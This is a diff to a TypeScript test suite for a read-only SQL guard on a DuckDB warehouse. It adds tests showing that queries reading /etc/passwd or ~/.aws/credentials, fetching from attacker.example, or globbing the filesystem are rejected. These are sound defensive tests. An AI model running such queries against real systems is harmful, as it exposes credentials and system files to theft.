@@ -35,6 +35,23 @@ describe("assertReadOnly", () => {
     // 'created_at', 'asset' etc. contain DDL substrings but must pass.
     expect(() => assertReadOnly("select created_at, asset_value from t")).not.toThrow();
   });
+
+  it("rejects filesystem / network table functions (secret exfiltration)", () => {
+    for (const sql of [
+      "select content from read_text('/etc/passwd')",
+      "SELECT * FROM read_csv('https://attacker.example/x.csv')",
+      "select * from glob('/**')",
+      "with x as (select * from read_parquet('/tmp/x.parquet')) select * from x",
+      "select * from read_json_auto('~/.aws/credentials')",
+    ]) {
+      expect(() => assertReadOnly(sql), sql).toThrow(/filesystem\/network/);
+    }
+  });
+
+  it("does not false-positive on columns that merely start like a file function", () => {
+    // read_count / thread_id / glob_pattern are columns (no call paren) - must pass.
+    expect(() => assertReadOnly("select read_count, thread_id, glob_pattern from t")).not.toThrow();
+  });
 });
 
 describe("Warehouse (engine-level enforcement)", () => {
@@ -55,7 +72,7 @@ describe("Warehouse (engine-level enforcement)", () => {
     }
   });
 
-  it("open() FAILS LOUDLY when the file does not exist — no silent read-write reopen", async () => {
+  it("open() FAILS LOUDLY when the file does not exist - no silent read-write reopen", async () => {
     await expect(Warehouse.open({ path: join(tmpdir(), `wh-missing-${process.pid}.duckdb`) })).rejects.toThrow(/READ_ONLY/);
   });
 
@@ -65,6 +82,18 @@ describe("Warehouse (engine-level enforcement)", () => {
     expect(res.rows.length).toBe(1000);
     expect(res.rowCount).toBe(2500);
     expect(res.truncated).toBe(true);
+  });
+
+  it("enforces the file-read boundary at the engine (external access is OFF)", async () => {
+    const wh = await Warehouse.open({ path: fixturePath });
+    // The denylist rejects the query before it reaches the engine…
+    await expect(wh.runSql("SELECT content FROM read_text('/etc/hostname')")).rejects.toThrow(
+      /filesystem\/network/,
+    );
+    // …and the engine itself has external access disabled as the hard boundary,
+    // so even a table function that slipped past the denylist could not read files.
+    const setting = await wh.runSql("SELECT current_setting('enable_external_access') AS v");
+    expect(setting.rows[0]?.v).toBe(false);
   });
 
   it("timeout interrupts the running query (killed, not abandoned)", async () => {
